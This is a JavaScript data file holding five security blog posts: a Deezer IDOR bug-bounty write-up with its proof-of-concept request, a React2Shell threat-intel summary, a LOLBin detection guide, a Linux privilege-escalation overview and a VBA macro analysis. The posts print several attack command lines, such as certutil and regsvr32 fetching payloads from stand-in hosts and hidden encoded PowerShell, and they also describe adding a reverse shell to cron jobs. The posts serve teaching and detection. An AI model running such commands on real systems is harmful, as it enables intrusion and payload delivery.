export const blogPosts = [
  {
    id: 1,
    title: "Disclosure of Private Playlist Metadata (Deezer IDOR)",
    date: "Dec 19, 2025",
    category: "bug-bounty",
    badge: "Bug Bounty Writeup",
    badgeType: "gold",
    excerpt: "A deep dive into an IDOR vulnerability I discovered in Deezer's legacy API. This logic flaw allowed authenticated users to bypass privacy controls and access full metadata of private playlists belonging to other users.",
    content: `
      <p><strong>Program:</strong> Deezer Bug Bounty Program<br>
      <strong>Severity:</strong> Medium (Confidentiality Loss)<br>
      <strong>Status:</strong> Resolved & Rewarded (€250)</p>

      <h3>Summary</h3>
      <p>I identified an Insecure Direct Object Reference (IDOR) vulnerability within the Deezer legacy API that allows an authenticated attacker to retrieve the full metadata of Private Playlists that do not belong to them.</p>

      <h3>Vulnerability Description</h3>
      <p>While the API correctly filters the actual song list (returning an empty array for unauthorized users), it fails to restrict access to the playlist's details. The API returns the Title, Description, Creator Name, Creation Date, and Song Count, even when the playlist status is explicitly set to Private.</p>

      <h3>Discovery & Behavior Analysis</h3>
      <p>During the analysis of the <code>deezer.pagePlaylist</code> method, I observed the following:</p>
      <ul>
          <li><strong>Expected Behavior:</strong> Accessing a Private playlist ID owned by another user should return a 403 Forbidden or 404 Not Found.</li>
          <li><strong>Actual Behavior:</strong> The server returned a 200 OK status. The JSON response contained the full playlist metadata object (DATA), revealing sensitive details like the Title and Description, despite filtering the song list.</li>
      </ul>

      <h3>Proof of Concept (PoC)</h3>
      <p><strong>Attacker Request:</strong></p>
      <pre><code>POST /ajax/gw-light.php?method=deezer.pagePlaylist&input=3&api_version=1.0 HTTP/2
Host: www.deezer.com
Content-Type: application/json

{
  "playlist_id": 14575894321,
  "lang": "en",
  "nb": 50,
  "start": 0,
  "tags": true,
  "header": true
}</code></pre>
      <p><strong>Server Response (Leak):</strong></p>
      <pre><code>{
  "results": {
    "DATA": {
      "PLAYLIST_ID": "14575894321",
      "TITLE": "demo testing",
      "STATUS": 1,
      "DESCRIPTION": "for idor check",
      "IS_PUBLIC": false
    }
  }
}</code></pre>

      <h3>Impact</h3>
      <p>In a real-world attack scenario, a malicious actor could exploit this vulnerability for:</p>
      <ul>
          <li><strong>User Profiling:</strong> Enumerating playlist IDs to collect titles that reveal personal context (e.g., "Medical Recovery", "Protest Planning").</li>
          <li><strong>Social Engineering:</strong> Leveraging this metadata to craft highly convincing phishing emails targeting specific users based on their private interests.</li>
      </ul>

      <h3>Remediation</h3>
      <p>The backend logic for <code>deezer.pagePlaylist</code> was updated to check permissions <strong>before</strong> fetching the DATA object, ensuring a 403 Forbidden response for unauthorized requests.</p>
    `
  },
  {
    id: 2,
    title: "React2Shell (CVE-2025-55182): Active Exploitation Analysis",
    date: "Dec 13, 2025",
    category: "cve threat-intel",
    badge: "Critical RCE",
    badgeType: "red",
    excerpt: "Deep dive into the CVSS 10.0 RCE in React Server Components. Analysis of active campaigns dropping MINOCAT tunnelers and XMRig miners.",
    content: `
      <p>A new critical unauthenticated remote code execution (RCE) vulnerability in React Server Components, tracked as <strong>CVE-2025-55182</strong> (aka "React2Shell"), is being actively exploited in the wild. With a CVSS score of 10.0, this is a "drop everything and patch" event.</p>
      
      <h3>The Vulnerability</h3>
      <p>The flaw allows unauthenticated attackers to send a single HTTP request that executes arbitrary code with the privileges of the web server process. It affects <code>react-server-dom-webpack</code>, <code>react-server-dom-parcel</code>, and <code>react-server-dom-turbopack</code> (versions 19.0 - 19.2.0).</p>
      
      <h3>Active Exploitation in the Wild</h3>
      <p>Threat Intelligence groups have observed multiple clusters exploiting this:</p>
      <ul>
          <li><strong>MINOCAT Tunneler:</strong> Threat-nexus actors are deploying a bash script to create hidden directories (<code>$HOME/.systemd-utils</code>), kill legit processes, and install the MINOCAT tunneler for persistence.</li>
          <li><strong>Crypto Miners:</strong> Financially motivated actors are dropping XMRig miners via bash drop files, establishing persistence via systemd services.</li>
          <li><strong>Web Shells:</strong> Advanced exploits are deploying in-memory Next.js web shells.</li>
      </ul>

      <h3>SOC Analyst Hunt Guide</h3>
      <p>If you are monitoring React or Next.js workloads, hunt for these indicators:</p>
      <ul>
          <li><strong>File System:</strong> Creation of hidden directories like <code>$HOME/.systemd-utils</code>.</li>
          <li><strong>Process Execution:</strong> <code>wget</code> or <code>cURL</code> commands initiated directly by web server processes.</li>
          <li><strong>Network:</strong> Outbound connections to unknown/unverified IPs containing base64 shells like <code>reactcdn.windowserrorapis[.]com</code>.</li>
      </ul>

      <h3>Mitigation</h3>
      <p><strong>Patch Immediately:</strong> Update React Server Components to version 19.2.3 or higher. If patching isn't possible immediately, deploy WAF rules to block the exploit payloads.</p>
    `
  },
  {
    id: 3,
    title: "Hunting Living-Off-The-Land Binaries (LOLBins) with Sysmon",
    date: "Feb 02, 2026",
    category: "blue-team",
    badge: "Threat Hunting",
    badgeType: "blue",
    excerpt: "Identifying advanced attackers relying on pre-installed, dual-use system administration tools like Certutil, PowerShell, and WMI to evade EDR and firewall detection schemas.",
    content: `
      <p>A "Living off the Land Binary" (LOLBin) is any legitimate OS binary that can be co-opted by attackers to execute malicious code, bypass execution restrictions, or download files without triggering signature-based alerts.</p>
      
      <h3>Why are LOLBins Dangerous?</h3>
      <p>Since these binaries (like <code>certutil.exe</code>, <code>regsvr32.exe</code>, or <code>bitsadmin.exe</code>) are digitally signed by Microsoft and native to the OS, standard Antivirus platforms often whitelist their execution outright.</p>

      <h3>1. Certutil for File Downloads</h3>
      <p><code>certutil.exe</code> is intended for handling certificates, but attackers frequently use its <code>-urlcache</code> flag to download payloads directly from external IPs.</p>
      <pre><code>certutil.exe -urlcache -split -f "http://10.10.10.5/payload.exe" C:\\Windows\\Temp\\payload.exe</code></pre>
      <p><strong>Detection Logic (Sysmon Event ID 1):</strong> Hunt for process creations of <code>certutil.exe</code> where the command line contains both <code>-urlcache</code> and <code>-split</code>.</p>

      <h3>2. Regsvr32 for AppLocker Bypass</h3>
      <p>The "Squiblydoo" technique uses <code>regsvr32.exe</code> to load a COM scriptlet directly from the internet, executing code in memory and easily bypassing AppLocker policies.</p>
      <pre><code>regsvr32 /s /n /u /i:http://malware.com/payload.sct scrobj.dll</code></pre>
      <p><strong>Detection Logic:</strong> Monitor for <code>regsvr32.exe</code> executing with the <code>/i</code> flag, especially when pointing to HTTP/S URLs and loading <code>scrobj.dll</code>.</p>

      <h3>3. PowerShell Downgrade Attacks</h3>
      <p>Security teams often enable PowerShell auditing (Script Block Logging - Event ID 4104). Attackers evade this by spawning older versions of PowerShell (like version 2) which lack advanced logging hooks.</p>
      <pre><code>powershell.exe -version 2 -w hidden -enc [BASE64]</code></pre>
      <p><strong>Detection Logic:</strong> Alert on any <code>powershell.exe</code> execution containing the <code>-version 2</code> argument, as legitimate administration rarely requires forcing version 2 execution.</p>

      <h3>Proactive Defense</h3>
      <p>If these utilities are not used by valid system administrators, use Application Control to block them outright. For monitoring, deep command-line auditing via Sysmon combined with SIEM correlation is non-negotiable.</p>
    `
  },
  {
    id: 4,
    title: "The Art of Privilege Escalation: From User to Root",
    date: "Dec 01, 2025",
    category: "red-team",
    badge: "Red Team",
    badgeType: "red",
    excerpt: "Mastering the climb. Exploring common Linux misconfigurations, SUID binaries, and kernel exploits to elevate privileges in a compromised environment.",
    content: `
      <p>Gaining initial access is only the first step. To truly compromise a system, you often need root privileges. This post explores common Linux privilege escalation vectors.</p>
      <h3>1. Kernel Exploits</h3>
      <p>Old kernels are a goldmine. Using <code>uname -a</code> can reveal the kernel version. If it's outdated, tools like <strong>DirtyCOW</strong> or <strong>PwnKit</strong> (CVE-2021-4034) might provide an instant root shell.</p>
      <h3>2. SUID Binaries</h3>
      <p>Binaries with the SUID bit set run with the privileges of the file owner (often root). Find them using: <code>find / -perm -4000 2>/dev/null</code>. If a binary like <code>nmap</code> or <code>vim</code> has SUID set, you can often spawn a root shell.</p>
      <h3>3. Misconfigured Cron Jobs</h3>
      <p>If a cron job runs a script that you can write to, you can simply add a reverse shell payload to it. The system will execute your malicious code with the privileges of the cron user (usually root).</p>
      <h3>Tools of the Trade</h3>
      <p>Automate your enumeration with scripts like <strong>LinPEAS</strong> or <strong>LinEnum</strong>. They highlight potential vectors in bright colors, saving you hours of manual searching.</p>
    `
  },
  {
    id: 5,
    title: "Analysing Malicious Office Macros via OLEVBA",
    date: "Jan 10, 2026",
    category: "cve threat-intel",
    badge: "Malware Analysis",
    badgeType: "gold",
    excerpt: "Static analysis breakdown of malicious heavily obfuscated VBA Macros delivered via Phishing campaigns. A deep dive into extracting execution strings using OLEVBA.",
    content: `
      <p>Despite Microsoft's recent push to block VBA macros originating from the internet (Mark of the Web), macro-enabled Office documents (<code>.docm</code>, <code>.xlsm</code>) remain heavily prevalent in spear-phishing campaigns. Examining these files without executing them is critical for safe SOC operations.</p>
      
      <h3>The Setup: Dissecting the Document</h3>
      <p>Modern office documents are effectively Zip archives containing XML structures. However, legacy formats and embedded OLE objects hide VBA streams that require specific extraction tools.</p>
      <p>For triage, <strong>OLEVBA</strong> (from the oletools suite) is the definitive standard for parsing streams dynamically.</p>

      <h3>VBA Obfuscation Techniques</h3>
      <p>When reviewing the macro code extracted by OLEVBA, you will rarely see a clear <code>DownloadFile()</code> command. Instead, you'll see sophisticated obfuscation:</p>
      <ul>
          <li><strong>String Reversal:</strong> Writing payloads backwards (e.g., <code>exe.daolyap</code>) and using built-in string reversal functions right before execution.</li>
          <li><strong>Chr() Encoding:</strong> Passing ASCII decimal arrays <code>Chr(112) & Chr(111) & Chr(119)...</code> to build <code>powershell</code> dynamically.</li>
          <li><strong>Junk Code Injection:</strong> Massive blocks of commented code or useless variable declarations specifically designed to disrupt signature detection.</li>
      </ul>

      <h3>Extracting the Execution Chain</h3>
      <p>Using <code>olevba --decode</code> will often trigger built-in emulation to reveal these hidden payloads automatically.</p>
      <pre><code>$ olevba invoice_urgent.docm

===============================================================================
FILE: invoice_urgent.docm
Type: OpenXML
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: word/vbaProject.bin - OLE stream: 'VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Sub Document_Open()
    Call ExecuteReversedStr
End Sub
...
-------------------------------------------------------------------------------
[+ Suspicious Keyword Found: CreateObject (used to instanciate WScript.Shell)]
[+ Executable Command Decoded: 'powershell.exe -w hidden -c IEX ...']
</code></pre>

      <h3>Conclusion</h3>
      <p>Always perform static analysis of VBA macros in dedicated, isolated virtual machines (such as REMnux) before progressing to dynamic debugging, and never open suspicious files on a corporate endpoint.</p>
    `
  }
];
